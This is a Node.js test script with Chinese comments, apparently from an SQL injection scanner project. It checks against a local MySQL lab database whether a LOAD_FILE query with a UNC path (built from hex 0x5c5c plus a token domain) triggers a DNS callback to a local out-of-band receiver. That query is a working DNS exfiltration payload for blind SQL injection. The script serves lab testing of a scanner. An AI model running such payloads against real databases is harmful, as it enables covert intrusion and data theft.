// 手动探针：真 MySQL 8.0.28 (secure_file_priv 已放行) 执行 LOAD_FILE UNC → 接收端捕获
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const require = createRequire(new URL('../../server/package.json', import.meta.url));
const mysql2 = require('mysql2/promise');
const { oobReceiver } = await import(pathToFileURL(resolve(dirname(fileURLToPath(import.meta.url)), '../../server/src/core/oobReceiver.js')).href);

await oobReceiver.start({
  enabled: true,
  callbackBase: '127.0.0.1:8899',
  httpPort: 8899,
  timeoutMs: 5000,
  dnsOob: true,
  dnsDomain: 'ooblab.test',
  dnsPort: 53,
});

const mysql = await mysql2.createConnection({ host: '127.0.0.1', port: 3307, user: 'root', password: 'root', database: 'sqli_lab' });
const [sfp] = await mysql.query('SELECT @@secure_file_priv AS v');
console.log('secure_file_priv =', JSON.stringify(sfp[0].v));

const TOKEN = 'mysqlunc99';
const sql = `SELECT LOAD_FILE(CONCAT(0x5c5c,'${TOKEN}.ooblab.test',0x5c78)) AS x`;
console.log('执行:', sql);
const [rows] = await mysql.query(sql);
console.log('LOAD_FILE 结果:', JSON.stringify(rows[0]).slice(0, 120));
await mysql.end();

const hit = await oobReceiver.waitForToken(TOKEN, 6000);
console.log(`接收端捕获 ${TOKEN}: ${hit ? '✅ 真 MySQL UNC 解析发起 DNS（引擎级 DNS OOB 可行）' : '❌ 未捕获'}`);
process.exit(hit ? 0 : 1);
